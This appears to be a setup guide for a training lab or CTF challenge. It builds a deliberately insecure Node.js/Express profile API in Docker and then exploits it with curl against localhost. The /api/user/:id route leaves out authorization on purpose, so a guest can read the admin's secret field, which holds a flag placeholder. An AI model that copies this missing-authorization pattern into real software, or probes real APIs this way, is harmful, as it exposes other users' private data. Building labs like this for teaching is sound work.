# Insecure Direct Object Reference (IDOR)

## Overview
A user profile API vulnerable to IDOR — any user can access any other user's profile by changing the ID.

## Architecture
- **Backend**: Node.js + Express
- **Database**: SQLite (via `better-sqlite3`)
- **Vulnerability**: No authorization check on user ID parameter

## Phase 1: Docker/DB Files

```bash
cat << 'EOF' > docker-compose.yml
version: '3'
services:
  app:
    build: .
    container_name: app
    ports:
      - "3000:3000"
EOF
```

```bash
cat << 'EOF' > Dockerfile
FROM node:18
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
EXPOSE 3000
CMD ["node", "app.js"]
EOF
```

## Phase 2: Dependencies

```bash
npm init -y && npm install express better-sqlite3
```

## Phase 3: Vulnerable App

```bash
cat << 'EOF' > app.js
const express = require('express');
const Database = require('better-sqlite3');

const db = new Database(':memory:');
db.exec("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, role TEXT, secret TEXT)");
db.exec("INSERT INTO users VALUES (1, 'admin', 'admin', 'FLAG_PLACEHOLDER')");
db.exec("INSERT INTO users VALUES (2, 'guest', 'user', 'No secrets here')");
db.exec("INSERT INTO users VALUES (3, 'john', 'user', 'Nothing important')");

const app = express();
app.use(express.json());

// Login returns a token (just the user ID for simplicity)
app.post('/login', (req, res) => {
    const { username } = req.body;
    const user = db.prepare("SELECT id, username, role FROM users WHERE username = ?").get(username);
    if (user) return res.json({ token: user.id, message: "Logged in as " + user.username });
    return res.status(401).json({ error: "User not found" });
});

// VULNERABLE: No auth check — any token can access any user's profile
app.get('/api/user/:id', (req, res) => {
    const user = db.prepare("SELECT * FROM users WHERE id = ?").get(req.params.id);
    if (user) return res.json(user);
    return res.status(404).json({ error: "User not found" });
});

app.listen(3000, '0.0.0.0', () => console.log('Listening on 0.0.0.0:3000'));
EOF
```

## Phase 4: Deploy
```bash
docker compose up -d --build
```

## Phase 5: Exploit
```bash
# Login as guest
curl -s -X POST http://localhost:3000/login -H "Content-Type: application/json" -d '{"username": "guest"}'
# Access admin profile (IDOR)
curl -s http://localhost:3000/api/user/1
```
